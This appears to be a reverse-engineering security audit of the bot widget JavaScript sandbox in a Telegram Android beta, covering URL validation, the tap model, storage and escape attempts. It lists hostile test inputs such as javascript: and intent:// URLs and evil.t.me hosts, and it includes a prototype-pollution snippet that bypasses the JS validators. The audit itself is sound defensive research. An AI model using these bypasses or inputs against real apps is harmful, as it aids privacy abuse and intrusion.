# Telegram Android 13.2.0 beta (72789) — bot widget JS API & browser-edge-case audit

> **Archive note (2026-11-01):** this audit predates the final W-9 verdict. W-9
> is **Medium, DoS/teardown only** (REPORT.md Addendum 3), not the "High" in
> the severity table below. A-1 remains a suspected privacy gap pending a
> server-side check.

> **Official-docs reconciliation (2026-11-09):** the official Telegram Widgets
> docs (core.telegram.org/bots/widgets) supersede several build-specific
> inferences in this note:
> - The forwarded-copy flag this build exposes as `isCopy`/`is_copy` is
>   documented as `TelegramWidget.isForward`.
> - Official tap model: one tap unlocks **one** call, shared between
>   `request`, `openLink`, `openTelegramLink` and `copyText`. The
>   "separate budgets" prediction in §7.2 and test #31 is superseded: the
>   budgets are shared.
> - Official widget-visible request error codes are `NOT_ALLOWED`, `BUSY`,
>   `RATE_LIMITED`, `TIMEOUT`, `FAILED`, `INVALID_ANSWER`; the numeric
>   statuses in §7.3 are internal engine diagnostics of this build.
> - The server decides where a widget may ask, per message (official table):
>   background requests only for the original in the private chat with the bot
>   (one on appear, then at most one per 5 s while visible). This answers the
>   §11 open question: the server does restrict background requests to the
>   private chat.
> - `fwd_allow_queries` (status-4 message, §2 note) and `background_query` are
>   not parameters of the official `sendWidget`; the official model is
>   `allow_queries` on a shared widget for requests from forwards.
> - Production availability (official): widgets only in the private chat with
>   the bot; forwarding widget messages is test-server only; widgets cannot be
>   copied (`copyMessage`/`copyMessages` refuse them). Production widgets
>   automatically have protected content.
> - Official crash latch: a stopped widget is rebuilt when shown again, but
>   **after two crashes in a row it stays stopped until the app restarts**
>   (Widgets guide, Lifecycle/Limits). A stopped bubble after two crashes is
>   the latch, not fresh evidence; restart the app before the next attempt.

- Target APK: `Android_Beta_13.2.0_(72789).apk` (sha256 `23727eb4…ee861`), package
  `org.telegram.messenger.beta`.
- Artifacts used (read-only):
  - `assets/WidgetSandbox/WidgetJS/{sandbox-bundle.js, validator-bundle.js, renderer-bundle.js}`
  - `jadx_out/sources` (`org/telegram/utils/twidget/*`, `org/telegram/ui/Components/{gl0,n81,q81,p81}.java`, `gf/f.java`, `org/telegram/ui/web/k0.java`)
  - IDB `libmessages_49_arm64_widget_annotated.i64` (read-only; addresses below are file/image offsets in that IDB)
- Method: static only. Java from jadx (+ androguard for the two methods jadx could not
  decompile), JS read from the shipped bundles, native from Hex-Rays.
- **No device, no APK/IDB modification.**

Notation: `sb@N` = byte offset in `sandbox-bundle.js` (offset of the symbol), `sub_XXXXXX` =
function in the IDB.

Companion documents: `POC/widget_sandbox_13.2.0/REPORT.md` (engine, DoS, QuickJS UAF),
`/tmp/opencode/twidget_interrupt_re.md` (CPU quota / interrupt). This document only covers
the **JS API surface, protocol handling, DOM/navigation, storage and the tap model**; it also
corrects several claims from the earlier report (§10).

---

## 0. TL;DR — what is actually true

1. **Widget `<script>` runs with zero interaction.** The engine is created and
   `SandboxEngine_runScripts` evaluates every inline `<script>` as soon as the widget view is
   bound/measured — for chat messages *and* for inline-result previews
   (`n81.java:40-66` creates the model with `preview=true`, `n81.java:68-85` starts it when a
   width is known). No tap, no visibility check (`is_copy` and `visible` do not gate script
   execution either — see the interrupt report §3).
2. **Therefore everything "read-only" is readable with no gesture**: `viewer` identity
   (at least the numeric user id; profile fields depend on a glue key-name detail, §5.4),
   `chatData`/`publicData` (≤1024 bytes each), `chatType`, `isCopy`, `isPreview`, theme,
   locale, and the widget's own `localStorage`/`sessionStorage`.
3. **Every *action* is gated in native code, not in JS.** In this build the engine mode is
   hard-coded `"strict"` (`JNI create`, 0x97EAE8), and in strict mode
   `openLink`, `openTelegramLink` **and `copyText`** require *a tap on the visible widget,
   one call per tap* (`sub_78CBF0`/`sub_79179C` + the block at 0x77FE68; diagnostic
   `"… ignored: it needs a tap on the visible widget and runs in that tap's handler, one
   call per tap (called from the <task> task)"`). JS-side validation is only a preview of the
   native validation, which re-does everything (§3, §7).
4. **URL handling has no browser-grade gaps.** `openLink`/`openTelegramLink` accept exactly
   `https://` + a strict host (labels `[a-z0-9-]`, no userinfo, port ≤65535) + a path made of
   a fixed percent-encodable ASCII set, ≤256 bytes; native rebuilds the string from parsed
   components before Java sees it. `javascript:`, `data:`, `blob:`, `file:`, `content://`,
   `intent://`, `tg://`, `mailto:`, `tel:`, `market://` are unreachable — even if the JS
   layer were bypassed (e.g. by `Object.prototype.toJSON`, §6.4) the native validator would
   reject them and would re-prefix `https://` anyway.
5. **No browser fetch surface.** No `fetch`/XHR/WebSocket/EventSource/Worker/beacon/share;
   `<form>` never navigates (`form.submit()` is explicitly disabled, `requestSubmit()` only
   dispatches an event); `location.*` is a diagnostic stub; `history.pushState` is a no-op;
   `<iframe srcdoc>`, `<object>`, `<embed>`, `<meta http-equiv=refresh>`, `<base>` have no
   loading behaviour; stylesheets and `@import` are parsed but never fetched; `<img>` is
   decoded **only** from `data:` URIs in Java (`loadImage`).
6. **Storage is local-only** (correction to the earlier report): `local`/`session` areas live
   in an in-memory `HashMap` keyed by widget (`p.f44432c`), are handed back at the next
   `create`, and are **never** put into any TL request. There is no `messages.editWidgetData`
   call in the client for them.
7. **Suspected gap (privacy):** `background_query` gives a **no-tap** `request()` channel,
   rate-limited to one per 5 s while visible (`sub_79A798` status 1/8 and the message
   `"background requests at most once per 5 s"`). The JS error text promises this only "in the
   private chat with the bot", but `m.java:105-109` copies the message flag with **no
   chat-type check**, and the native state machine's inputs are only
   `{tap, visible, can_query, background_query, wallet, wallet_available}` — no chat type.
   If neither the server nor the native option parser adds the condition, a widget in a
   group/channel calls its bot every 5 s and discloses the viewer's user id with zero
   interaction. Needs an on-device/server-side check. **Official docs (2026-11-09): the
   server decides where a widget may ask and allows background requests only for the
   original in the private chat with the bot; that closes the gap in the official model
   (live confirmation for this build is still worthwhile).**
8. **Suspected JS-layer bypass (low impact):** `Object.prototype.toJSON` (or
   `Array.prototype.toJSON`) lets widget JS control the exact JSON string of
   `__host("bridge", JSON.stringify([method, args]))` and of the other `JSON.stringify`-based
   host calls (`query`, `intl`, `storage`, `anim`). All documented bridge methods are
   re-validated natively, so no privilege escalation was found — but it does bypass the JS
   validators and feeds attacker-chosen JSON into the native parsers. Test item §9 #27.
9. **`copyText` looks unwired in Java** in this build: the action is validated and
   tap-gated natively, but there is no `ClipboardManager`/`ClipData` use anywhere in the
   twidget Java path. Needs a device test (§9 #30).

---

## 1. Execution model and trust boundary (for orientation)

```
bot payload (gzip/zlib)  ──p.m()──►  JSON {"html": …}  ──create()──►  QuickJS sandbox
        (UI thread, p.java:367)                                        (6 MiB heap)
                                                                          │  <script>s
                                                                          ▼
   DOM/CSS ops (binary words + strings) ──► __hostOps ──► native ──► validator JS context
                                                                          │  (separate
                                                                          │   JSRuntime)
                                                                          ▼
                                                              Java Canvas / RenderNode
   privileged calls ──► __host("bridge"/…) ──► native policy ──► Java (w.f, Wallet, …)
```

- Boot: `SandboxEngine_start` (0x785AD0) evals `sandbox-bundle.js` then `hide-host.js`
  (0x785C74/0x785CC0, string 0x2365F8), then runs widget scripts (`SandboxEngine_runScripts`
  0x7849AC, ≤1000 scripts, `src=` scripts skipped, no size cap beyond the JS heap).
- The validator is a **second runtime**: `sub_7A02E0` allocates a fresh
  `JSInterruptRuntime`, evals `validator-bundle.js`, then the 715-byte glue
  (0x2313D3) that defines `globalThis.__v_processOps/__v_validateQuery/…` over
  `__twValidator`. Widget JS has no handle to it (§6.2).
- `renderer-bundle.js` is **not** part of the Android path: it is a WebView adapter
  (`window.webkit.messageHandlers.tw`, `__twReceive`, `document.currentScript.remove()`),
  shipped in the shared asset set and referenced by the native resource loader (0x778B90),
  but no Android consumer was found (no WebView, no `addJavascriptInterface`, no
  `messageHandlers` string in `libtmessages.49.so`). Do not treat it as live attack surface
  on this platform without a positive runtime observation.

---

## 2. Capability matrix

Legend — **None**: works right after the widget is laid out, no interaction. **Tap**: needs a
real tap on the *visible* widget (native counter, §7). **n/a**: not available in this context.

| API | No gesture | One tap | JS-side check (sb offsets) | Native re-check | Java effect |
|---|---|---|---|---|---|
| `viewer` (id, …) | **Yes**, if `can_query` (`m.java:105`) | — | `QE` accepts `id`, `username` 5–32 `[A-Za-z0-9_]`, `first_name`/`last_name` ≤64, `is_premium` (sb@534580) | — (config only) | `p.e()` builds `viewer{id,firstName,lastName,username,isPremium}` (`p.java:236-248`) |
| `chatData` | **Yes**, unless `is_copy` (want `Du`, ≤1024 B) | — | `Du` (sb@534580) | — | from TL `messageMediaWidget.chat_data` (`m.java:119`) |
| `publicData` | **Yes** (≤1024 B) | — | `Du` | — | TL field, refreshable via `watchPublicData` |
| `chatType` / `isCopy` / `isPreview` | **Yes** | — | `$E` (`private/group/supergroup/channel`) | — | `m.java:100-122` |
| `theme`, `themeParams`, `colorScheme`, `contentSafeAreaInset`, `isActive` | **Yes** | — | `_d`/`Ad`/`Dc` | native pushes updates | host theme only |
| `onEvent/offEvent` (`themeChanged`, `activated`, `deactivated`, `chatDataChanged`, `publicDataChanged`, `contentSafeAreaChanged`) | registration only; 16 handlers max | — | `Fu` | — | — |
| `localStorage` / `sessionStorage` | **Yes** (4 KiB per area, string values) | — | quota + 4096 B/area (`sb@525851`) | native storage callback | in-memory only (`p.f44432c`) |
| `request(data,{wallet})` | **Only if `background_query`** (1 per 5 s, visible) | yes, 1 per tap | `mC` (sb@536443): data 1–64 B UTF-8, options `{wallet}` only, `can_query`, not preview | `sub_780D8C` → `sub_79A798`: `can_query`, one-in-flight, wallet, background/5 s, tap | `p.u()` → `messages.getBotWidgetQueryAnswer`; answer back to JS |
| `wallet.sendTransaction/signData` | **No** (wallet always needs a tap: status 7) | yes, 1 per tap + wallet UI confirm | `T1` (sb@536949): TON-Connect schema, ≤255 msgs, addresses, amounts, base64 limits | `sub_795758` arg typing + `sub_780D8C` (wallet bit) | `w.i()` → Wallet `fe` confirm window |
| `copyText(text)` | **No** | yes, 1 per tap | `KE` (sb@538248): 1–256 UTF-16 units, no lone surrogates | `sub_7984A8` (same), §7 gate | *no handler found* (see §5.5) |
| `openLink(url)` | **No** | yes, 1 per tap **+ confirm dialog** | `gc` (sb@507888) https-only, no userinfo, non-Telegram host | `sub_791B84` (identical + rebuild) | `w.f` alert dialog → `web.k0` → `gf.f.q` |
| `openTelegramLink(url)` | **No** | yes, 1 per tap, **no dialog** | `gc` requires `t.me`/`telegram.me`/`telegram.dog` (or subdomain) | same | `gf.f.r` → `gf.f.q` (internal resolver) |
| `HapticFeedback.*` | **No** (needs a touch series, visible) | up to 5 per burst / 10 per s | enum check `ud` (sb@533817) | `sub_79A954` + name/struct check in `sub_79296C` | `w.f` → `View.performHapticFeedback` |
| `ready()`, `setResizeAnchor(edge)` | **Yes** | — | `fC` (`top`/`bottom`) | preview allowlist (`sub_791858`) — these two are the *only* preview-allowed actions | host/UI |
| `watchPublicData()` / `unwatchPublicData()` | **Yes** (dedup) | — | `b1` | — | triggers `messages.getWidgetPublicData` |
| `console.*` | **Yes**, unlimited, 4 KB per call | — | none | log callback | logcat |
| `crypto.getRandomValues`, `crypto.randomUUID` | **Yes** | — | length only | host `random` | native RNG (quality unverified) |
| `Intl.*` | **Yes** | — | option schema in `Rt` (sb@526849) | host `intl` → `WidgetSandboxBackend.formatIntl` | ICU |
| `document.title` | **Yes** | — | — | host `title` | widget title |
| `navigator.*` network/share/clipboard, `fetch`, XHR, WS, Worker, `sendBeacon`, `share`, `clipboard.read*` | **No** — stubs throw / `NetworkDisabledError` | — | `cC` (sb@531852), `q1` (sb@543250) | — | — |

Notes:

- `TelegramWidget.profile` is the constant `1` and `isProfileAtLeast(e)` is `1 >= e`; this is
  the API-version gate, not a data field.
- `TelegramWidget.isActive` is `!hidden` where `hidden` is set by the native `visibility`
  event; `visibilitychange` fires too.
- Handlers registered with `onEvent` are capped at 16 per event; `onTheme` at 16 total.
- `is_copy` hides `chatData` in JS (`H1`, `sb@534580`) but does **not** by itself disable
  queries: a forwarded copy keeps `can_query` if the original was sent with
  `fwd_allow_queries` (see the status-4 message at `0x2A6CB4`), in which case the copy can
  still call the bot and learn who viewed it.

  > Live-test correction, 2026-11-08: a user-forwarded third-party widget
  > arrived with `widget: {html, is_copy: true}` and **no** `widget.id` or
  > query handle. The forwarded copy was static HTML; the old inference that
  > `can_query` survives was not observed in the Bot API object. The
  > `fwd_allow_queries` role for client-side user forwards remains untested
  > live. Do not build a live channel on a forwarded copy.
  >
  > Official-docs note (2026-11-09): the JS flag is documented as
  > `TelegramWidget.isForward`; forwarding widget messages is test-server
  > only, and production widgets automatically have protected content and
  > cannot be forwarded.

---

## 3. URL / protocol handling

### 3.1 JS normaliser `gc(kind, url)` — `sb@507888`

```js
function gc(t,e){
  if(typeof e!="string"||It(e)>256||UE(e.slice(0,8))!="https://")return null;   // UTF-8 bytes; literal https://
  let r=8; for(;r<e.length&&e[r]!="/"&&e[r]!="?"&&e[r]!="#";)r++;              // authority ends at / ? #
  let n=e.slice(8,r); if(n.includes("@"))return null;                           // no userinfo
  let s=n.indexOf(":"), i=UE(s<0?n:n.slice(0,s)), a=s<0?null:n.slice(s+1);      // host, port (lowercased host)
  if(a!==null&&!/^[0-9]{1,5}$/.test(a)||a!==null&&Number(a)>65535||i.length===0||i.length>253)return null;
  for(let l of i.split(".")) if(l.length===0||l.length>63||!/^[a-z0-9-]+$/.test(l)||l[0]=="-"||l[l.length-1]=="-")return null;
  if(l2(i)!==(t==="openTelegramLink"))return null;                              // telegram-host XOR openLink
  // path loop: ASCII must be in c2 = A-Za-z0-9 -._~:/?#[]@!$&'()*+,;=%  ('%' must be %HH);
  // non-ASCII -> UTF-8 -> %XX ; lone surrogates rejected
  let f="https://"+i+(a===null?"":":"+a)+o; return f.length>256?null:f;         // rebuilt, not the input
}
l2 = h => ["t.me","telegram.me","telegram.dog"].some(d => h===d || h.endsWith("."+d));
```

Consequences:

- **Scheme is exact**: 8 literal bytes `https://` after ASCII-lowercasing. `HTTP://`,
  `http://`, `HTTPS://` (works, lowercased), `java\tscript:`, ` javasc…`, `//host/path`,
  relative paths, `#frag` all fail.
- **No userinfo**: any `@` in the authority rejects. `@` is allowed *after* the authority
  (in path/query/fragment) — `https://example.com/@x` is fine.
- **Host**: ASCII only, label rules; no `[`/`]`, so no IPv6 literals; no backslash; no
  trailing dot; no empty labels.
- **Telegram hosts** are `t.me`, `telegram.me`, `telegram.dog` **and any subdomain**
  (`evil.t.me` passes `l2`). `openLink` refuses telegram hosts; `openTelegramLink` requires
  one.
- **Path** is re-encoded: only `A-Za-z0-9` and `-._~:/?#[]@!$&'()*+,;=%` survive; every other
  byte/character becomes `%XX` (UTF-8). `%` must be followed by two hex digits. `%2f`,
  `%00`, `%0d%0a` are accepted and **preserved verbatim**.
- The value handed to native is the **rebuilt** string, never the caller's string, so
  uppercase schemes, unicode lookalikes and odd separators cannot reach Java.

### 3.2 Native re-validation `sub_791B84` (0x791B84, 709 decompiled lines)

Independently re-implements the same policy on the bytes the JS passes:

```
len 8..256  →  lowercase first 8 == "https://"  →  authority scan (/, ?, #; plus 0x13)
→ memchr('@') in authority → reject
→ optional ':' port: digits only, value < 0x10000, **empty port accepted**
→ host 1..253, per-label 1..63, [0-9a-z-], no leading/trailing '-'
→ telegram-host check must match the method name exactly ("openLink" vs "openTelegramLink")
→ path: valid UTF-8 (1..4-byte sequences) re-encoded as %XX when >=0x80;
         ASCII must be alnum or in "-._~:/?#[]@!$&'()*+,;=%", '%' needs 2 hex
→ rebuild "https://" + host + [":"+port] + path ; reject if > 256 bytes
```

Differences vs JS: native accepts an **empty port** (`https://host:/x`) and has one extra
authority terminator (0x13, harmless because 0x13 then fails the path set). Neither is
reachable from widget JS (JS normalises first). Native **never trusts** the input string: it
reconstructs it, so even a hypothetical JS bypass cannot smuggle a scheme.

### 3.3 Java `w.f` and `gf.f`

`w.f(JSONObject)` (`w.java:177-221`) is the only consumer of the native action:

- `kind == "openTelegramLink"` → `gf.f.r(parentActivity, url)` — **no confirmation dialog**.
- `kind == "openLink"` → `AlertDialog` with the URL in the body (`cd.a0(…, url)`), guard
  `p.f44435i` against stacking, "Open" → `new org.telegram.ui.web.k0(1, activity, url)`,
  whose `h()` does `gf.f.q(ctx, Uri.parse(url), true, false, false, …)` (`web/k0.java:683-685`).
- `kind == "haptic"` → `view.performHapticFeedback("selection"?4 : "notification"?16 : 3)`.

`gf.f.r` → `gf.f.q(context, Uri.parse(str), true, true, false, …)` (`gf/f.java:576-581`).
`gf.f.q` is Telegram's generic URL opener (the same one used for message links): it handles
`https`/`http` (custom tabs / browser), `tel`, `intent` (+`browser_fallback_url`), and
special-cases `telegram.org`, `t.me`, `telegram.me`, `telegram.dog` (string constants inside
`gf.f.q`). **The widget path can only feed it the native-rebuilt `https://…` string**, so the
`intent:`/`tg:`/`tel:` branches are dead for widgets. `gf.f.r` also passes the "show alert"
flags as true, so even `openTelegramLink` may show Telegram's own open-link prompt for
non-username paths — that is a *generic* `gf.f.q` behaviour, not a widget-specific check.

### 3.4 Scheme / edge-case matrix (what a widget can reach)

| Input | `openLink` | `openTelegramLink` | Anchor `<a href>` | Notes |
|---|---|---|---|---|
| `https://example.com/x` | OK (tap + dialog) | JS TypeError | dialog | |
| `https://t.me/durov` | JS TypeError (telegram host) | OK (tap, no dialog) | internal resolver | |
| `https://evil.t.me/x` | TypeError | **accepted** (`l2` subdomain) | internal resolver | DNS still t.me; resolver sees path `/x` |
| `https://telegram.me/x`, `…dog/x` | TypeError | accepted | internal | canonicalised by `gf.f.q` |
| `https://user@host/` | TypeError | TypeError | ignored | native also rejects `@` in authority |
| `https://host:8443/` | OK | if host ∈ telegram | dialog | port validated 1–5 digits ≤65535 |
| `https://host:99999/`, `:abc`, `:/x` | TypeError | TypeError | ignored | JS rejects empty port; native alone would accept `:/` |
| `HTTPS://EXAMPLE.COM/A` | OK, normalised lowercase host | — | dialog | path case preserved |
| `https://xn--80ak6aa92e.com/` | OK (punycode is ASCII) | — | dialog shows **punycode**, not Unicode | no IDN decoding anywhere |
| `https://exämple.com/` | TypeError | TypeError | ignored | non-ASCII host rejected |
| `https://host/%2f%2fevil` | OK | if telegram host | dialog | `%2f` preserved, not decoded |
| `https://host/%00` | OK | if telegram host | dialog | `%00` preserved; Java `Uri.parse` keeps it encoded |
| `https://host/#frag` | OK | OK | dialog | fragment part of path set |
| `javascript:alert(1)` | TypeError | TypeError | explicitly logged `"javascript: link ignored"` | |
| `data:…`, `blob:…`, `file:…`, `content://…`, `intent://…`, `tg://…`, `mailto:`, `tel:`, `market://…` | TypeError | TypeError | ignored (`"link ignored (openLink takes https: …)"`) | native would reject/rebuild anyway |
| `//evil.com/x`, `/relative`, `#x` | TypeError | TypeError | ignored (fragment-only skipped) | |
| 257-byte https URL | TypeError | TypeError | ignored | 256 max, UTF-8 bytes |
| `https://127.0.0.1/`, `https://localhost/` | OK | TypeError | dialog | no SSRF: opens the user's browser |

**No non-https or internal-scheme gap was found.** The only "internal" navigation is
`openTelegramLink` to Telegram-owned hosts (by design), which can open profiles/chats, join
dialogs, `t.me/iv?url=…` Instant View, etc.

---

## 4. Navigation / DOM — what is fetched, and by which component

The widget DOM is a JS re-implementation (parse5 + custom classes) that emits ops to native;
the *paint* document is also parsed by litehtml/gumbo in `libtmessages.49.so` from the
payload HTML. Neither has a network stack.

| Construct | Behaviour | Component | Fetched? |
|---|---|---|---|
| `<a href>` + real tap | `J1` (`sb@588296`) → `closest("a[href]")` → `xd` (`sb@533457`) → `gc` → bridge | sandbox JS → native gate → Java | no (dialog / resolver) |
| `<a href>` + `el.click()` | same path **but** native tap counter unchanged → blocked | sandbox JS | no |
| `window.open(url)` | `H.open = i => (i && xd(i), null)` (`sb@545054`) | sandbox JS | no |
| `location.href/assign/replace/reload` | diagnostic `"navigation-blocked"`, no navigation (`sb@543250`) | sandbox JS | no |
| `history.pushState/replaceState/back/forward/go` | no-ops | sandbox JS | no |
| `<form action>` + submit | submit event only; `form.submit()` is a no-op that logs "navigation is disabled"; `requestSubmit()` just dispatches the event | sandbox JS (`sb@491784`, form class `sb@503795`) | no |
| `<iframe src>`, `srcdoc` | element with attributes only; no nested browsing context, no script execution | sandbox DOM (inert) | no |
| `<object>`, `<embed>`, `<applet>` | element only | sandbox DOM | no |
| `<meta http-equiv=refresh>` | attribute only; no timer | sandbox DOM | no |
| `<base href>` | only affects `baseURI` (returns the attribute string) | sandbox DOM | no |
| SVG `<a xlink:href>` | `closest("a[href]")` only matches an `href` attribute; `xlink:href` is parsed as a namespaced attribute and was **not** observed to be aliased to `href` (needs a device check, #36). A plain `href` on an SVG `<a>` follows the normal click path | sandbox JS | no |
| `<link rel=stylesheet>`, `@import`, CSS `url()` | parsed into CSSOM / style ops; **no fetch**; background images go through the native image callback | litehtml + `WidgetSandboxBackend.loadImage` | only `data:` |
| `<img src>`, `srcset` | renderer asks the container for the image → Java `loadImage` | litehtml → JNI → Java | only `data:` (≤2 MiB URI, MIME sans `svg`, ≤4 Mpx, 32 MiB budget, 64-bit math) |
| `<a download>` | ignored; still `openLink` | sandbox JS | no |
| `<a ping>`, `referrerpolicy` | attributes only | — | no |
| `<video>/<audio>/<source>` | elements; `Audio` logs "unsupported" | sandbox DOM | no |
| `document.cookie` | getter `""`, setter logs unsupported | sandbox | no |
| `navigator.sendBeacon`, `share`, `clipboard.read*` | throw / `NotAllowedError` | sandbox | no |

The only component that can create a network request from widget input is the **bot-request
path** (`request`/wallet, §7) and `watchPublicData` (`messages.getWidgetPublicData`), both
explicit APIs, not markup.

---

## 5. Storage & privacy

### 5.1 `localStorage` / `sessionStorage` (`sb@525851`, `sb@525458`)

- Two `Map`s (`yd = {local, session}`) with a byte budget of **4096 per area**; values are
  coerced with `String()`; `Proxy` exposes Web-Storage semantics (`getItem`, `key`, `length`,
  property access).
- At boot the sandbox calls `R1(config.storage)`: the native config carries the previous
  contents; at every `endTick` dirty areas are sent to native as
  `__host("storage", {"local":{…},"session":{…}})` (`endTick`, `sb@595315`).
- Native `signal(11)` → Java `w.h(area, JSONObject)` (`w.java:269-304`): it merges the area
  into `p.f44432c` (a **static in-memory HashMap** keyed by widget) and schedules a 1 s
  debounce. `p.f44432c` is read back at the next `k0` creation (`p.java:331`, `p.java:633-641`).
- **Nothing writes it to disk and nothing puts it into a TL request.** The earlier report's
  hypothesis ("synced through messages.editWidgetData, so the bot may read it") is **not
  supported** by this build: `TL_messages_editWidgetData` only carries `public_data` and is
  not constructed anywhere in the Java tree; the only `editMessageWidgetData` class carries
  `chat_data`/`public_data`, not storage.
- Consequence: storage is a per-process scratchpad (lost on process death); it cannot
  exfiltrate anything by itself.

### 5.2 Cookies / other storage

`document.cookie` → `""` / `"unsupported"` diagnostic. No `indexedDB`, `caches`,
`crypto.subtle`, `Notification`, `serviceWorker`, `geolocation` (undefined). `Blob`/`FileReader`
are inert stubs.

### 5.3 Clipboard, share, beacon

`navigator.clipboard.{writeText,readText,write,read}` → `NotAllowedError`;
`navigator.sendBeacon` throws `NetworkDisabledError`; `navigator.share` rejects. The only
clipboard path is `TelegramWidget.copyText` (tap-gated, §7) — and see §5.5.

### 5.4 What the bot can learn with zero interaction

- `viewer`: Java fills `{id, firstName, lastName, username, isPremium}` **only when
  `can_query`** (`p.java:236-248`), so no gesture is involved. The JS config reader only
  accepts `id`, `username` (5–32 `[A-Za-z0-9_]`), `first_name`, `last_name` (≤64),
  `is_premium` (`sb@534580`), while the native layer has its own viewer serialiser
  (`sub_799014`) that emits exactly those snake_case keys; the native *input* is Java's
  camelCase JSON, so the surviving field set must be confirmed on device (test #1).
  At minimum the **numeric user id** and, if accepted, the username are readable — enough to
  identify the viewer to the bot.
- `locale` (`cd.D0().f15003y.toLanguageTag()`, `p.java:289-295`), theme, screen metrics,
  `devicePixelRatio` → fingerprinting surface, but no egress.
- `publicData` (bot-controlled) and `chatData` (bot-controlled, hidden for forwarded copies).

An actual **egress** with no gesture exists only through `request()` when
`background_query` is set (§7.3) — that call identifies the user to the bot.

### 5.5 `copyText` wiring

Native validates the string (1–256 UTF-16 units, valid UTF-8) and tap-gates it, then emits an
action. Java's widget bridge only handles `openLink`/`openTelegramLink`/`haptic`
(`w.java:177-221`); there is no `ClipboardManager`/`ClipData`/`setPrimaryClip` anywhere in
`org.telegram.utils.twidget`, and no clipboard string in `libtmessages.49.so`. Either the
action is dropped in this beta or it is handled by a path I could not attribute statically —
on-device test #30 decides.

---

## 6. Sandbox escapes

### 6.1 Host globals

`hide-host.js` (native string 0x2365F8) runs after `sandbox-bundle.js` and before any widget
`<script>`:

```js
(function(g){for(const n of ['__host','__hostBinary','__hostCanvas','__hostOps','__twDispatch'])
  if(!delete g[n]) throw new Error(n);})(globalThis);
```

The bundle captures `xf=__host`, `Z8=__hostBinary`, `Ko=__hostCanvas`, `Nf=__hostOps` at module
scope before deletion (`sb@444604`). Only `xf` (as `me`) and `Ko`/`Nf` are used; all are
module-scoped and not reachable from widget code. `__hostBinary` (`Z8`) is captured but unused.

`typeof __host === "undefined"` for widget JS; a direct call throws `ReferenceError`.

The remaining helpers that *do* call `me` (`crypto.getRandomValues`, `Intl.*`,
`console.*`, `document.title`, the layout `query`, `storage`, `anim`) all pass a **fixed
method name** compiled into the bundle; the widget only controls the argument string. There
is no exposed function that takes a method name, so this is not a generic bridge.

### 6.2 Validator context

`sub_7A02E0` creates a **separate JSRuntime** for the validator and evals
`validator-bundle.js` + the `__v_*` glue there. `__v_processOps`, `__v_validateQuery`,
`__v_validateListen`, `__v_validatePreventDefault`, `__v_validateAnim`, `__v_setTheme`,
`__twValidator`, `__twNode` therefore exist only in that runtime. Widget JS cannot read
`__v_processOps`/`__twValidator` (test #26). The ops the sandbox emits go through the binary
encoder (`ou`, `sb@444604`) straight to `__hostOps`; the validator re-checks/re-serialises
them before Java.

### 6.3 Parent / Telegram objects

There is no parent JS context. `window/self/top/parent/frames` are all the same object
(`q1`, `sb@543250`), `H.origin = "null"`, `document.location` is the same stub. No
`TelegramWebviewProxy`, no `webkit.messageHandlers`, no `window.Telegram.WebApp`.

### 6.4 Prototype pollution / `Function` / `eval`

- `eval` and the `Function` constructor are available (no CSP), but they run in the same
  QuickJS context: no new privilege.
- The bundle does not freeze `Object.prototype`/`Array.prototype`. Bridge/host payloads are
  serialised with `JSON.stringify` (`vr = (t,...e) => me("bridge", JSON.stringify([t,e]))`,
  `sb@532602`; `Or` for `query`, `Rt` for `intl`, `endTick` for `storage`).
  `JSON.stringify` consults `toJSON` at call time, so **widget JS can do**

  ```js
  Object.prototype.toJSON = function(){ return ["openLink", ["https://example.com"]]; };
  ```

  and thereby replace the serialised payload of *any* host call made by the bundle that
  happens to be stringified next (the array `[method, args]` inherits `Object.prototype`).
  This bypasses the JS-side validators (`gc`, `KE`, `td`, `T1`, `zE`, …) completely.
  **Impact found: none beyond what the native layer re-validates.** `sub_795758` types the
  arguments, `sub_791B84` re-checks URLs, `sub_7984A8` re-checks copy text, `sub_79633C`
  re-checks request data, haptic names are memcmp'd, and the wallet payload goes to the
  wallet UI. The residual risk is parser robustness of the methods that are *not*
  security-checked (layout `query`, `intl`, `storage`, `anim`), which now receive
  attacker-chosen JSON — test #27.
- `structuredClone` is a JSON round-trip (`sb@539387`), so it also honours `toJSON`.
- `Object.prototype` pollution can also change the bundle's `for…in`/`Object.assign` results;
  I found no gate that depends on such iteration over attacker-controlled objects.

### 6.5 Native engine

Out of scope here (see the two companion reports): quickjs-ng ≥0.17, the `js_array_find`
double free, litehtml/gumbo snapshot and the two OOM loops. Those remain the realistic
memory-corruption paths — the JS API layer itself did not yield an escape.

---

## 7. The tap model (what one tap really buys)

### 7.1 The counter

Two engine fields are compared on every privileged bridge call (strict mode):

- `engine+0x630` (`+1584`) — current tap counter,
- `engine+0x634` (`+1588`) — value consumed by the last privileged call,
- `engine+0x3B9` (`+953`) — visible flag.

The guard (0x77FE68–0x77FF00; blocked branch 0x77FFF8):

```
if mode=="compat"                       -> allow (hard-coded off in this build, 0x97EAE8)
if method not in {openLink, openTelegramLink, copyText} -> allow (own gates elsewhere)
if tap_counter > consumed && visible    -> consumed = tap_counter; tap_counter = 0; ALLOW
else                                    -> "activation-blocked" diagnostic; DROP (max 20 logs)
```

`sub_79179C` is literally `method ∈ {"openLink","openTelegramLink","copyText"}` (three
16-byte Rust string constants). The diagnostic emitted in the else branch is the one quoted
in §0.

### 7.2 Consequence

- **One tap ⇒ at most one of** `openLink`, `openTelegramLink`, `copyText`. The counter is
  zeroed on use, so a second call in the same tap's handler is dropped.
- A **synthetic** `click()`/`dispatchEvent` does *not* advance the native counter, so widget
  JS cannot forge the activation.
- **Visible** is required: a widget scrolled out of view (`visibility` false) cannot open
  links or copy even if a stale tap exists.
- Requests/wallet use a **different** state machine (`sub_780D8C` → `sub_79A798`, state at
  `engine+0x6A0`), so a single tap can in principle authorise *one link/copy* **and** *one
  request* — separate budgets. Worth confirming on device (test #31). **Official-docs note
  (2026-11-09): one tap unlocks one call shared between `request`, `openLink`,
  `openTelegramLink` and `copyText`; the separate-budget reading is build-specific and
  superseded.**

### 7.3 Request/wallet state machine (`sub_79A798`, 0x79A798)

```
a2 = {tap_now>tap_consumed, visible, can_query, background_query, wallet, wallet_available}
if !can_query                       -> 4 "server allows no requests … (no can_query …)"
if wallet && !wallet_available      -> 5 "the client has no wallet for this user …"
if already_used                     -> 6 "a request is already in flight"
if tap && visible                   -> consume, allow
if wallet || !background_query      -> 7 "needs a tap on the visible widget, one request per tap;
                                          this message allows no background requests (no background_query)"
if visible                          -> 1 (allow) but if <5 s since last -> 8 "background requests at most once per 5 s"
else                                -> 2 (defer/queue)
```

The exact status strings are the jump table at `0x2A6CB4` (5 entries, verified).

**Finding:** `can_query` and `background_query` are copied from the TL
